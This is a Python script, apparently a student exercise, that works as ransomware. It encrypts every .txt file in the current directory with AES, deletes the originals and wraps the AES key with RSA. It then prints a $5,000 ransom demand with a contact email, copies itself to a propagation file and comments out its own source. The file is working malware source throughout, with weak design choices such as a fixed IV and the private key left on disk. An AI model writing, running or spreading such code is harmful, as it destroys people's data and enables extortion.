import os
import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Util.Padding import pad 
from Crypto.Random import get_random_bytes

key = get_random_bytes(32) #store 256 bit key
iv = b"secretbase123456"

files_list = os.listdir() #store list of files in current directory
txt_substring = ".txt"

for txt_file in files_list: #for each file name in the list of files 
   if txt_substring in txt_file: #if file is a .txt file

     file_in = open(txt_file, "rt") #read in the data as a string
     data = file_in.read()
     b_data = data.encode('utf-8') #convert string to bytes
     cipher = AES.new(key, AES.MODE_CBC, iv) #specify CBC mode
     ct_bytes = cipher.encrypt(pad(b_data,AES.block_size)) #pad is required to change to 128/256 bit block    
     ct = b64encode(ct_bytes).decode('utf-8') #change bytes to string
     file_in.close() #encrypt data

     os.remove(txt_file) #remove text file
     txt_file = txt_file.replace('.txt','.enc') #replace .txt in file name to .enc
     
     file_out = open(txt_file, "wt+") #create new text file
     file_out.write(ct) #write cypher text to file
     file_out.close()

rsa_key = RSA.generate(2048) #generate RSA key

private_key = rsa_key.export_key() #create private key for writing to file
file_out = open("ransomprvkey.pem", "wb+") #create ransomprvkey.pem file for private key
file_out.write(private_key)
file_out.close()

public_key = rsa_key.publickey() #create publick key
file_out = open("key.bin", "wb+") #create key.bin file for public key
cipher_rsa = PKCS1_OAEP.new(public_key)#encrypt key used for symmetric encryption using public key encryption
enc_data = cipher_rsa.encrypt(key)
file_out.write(enc_data)
file_out.close()

print("Your text files are encrypted.To decrypt them, you need to pay me $5,000 and send key.bin in your folder to kk908@uowmail.edu.au")

with open(sys.argv[0]) as ransomware_lines: #open file that was executed on terminal and store all lines in the program into a list
   ransomware = ransomware_lines.readlines()

file_out = open("ransomware_propagation.py", "wt+") #create new file to propogate ransomware to and write each line from the list into that file
for i in ransomware:
  file_out.writelines(i)
file_out.close()

file_in = open(sys.argv[0], "wt") #open file that was executed on terminal and write to file each line commented out
for j in ransomware:
  file_in.writelines('#' + j)
file_in.close()
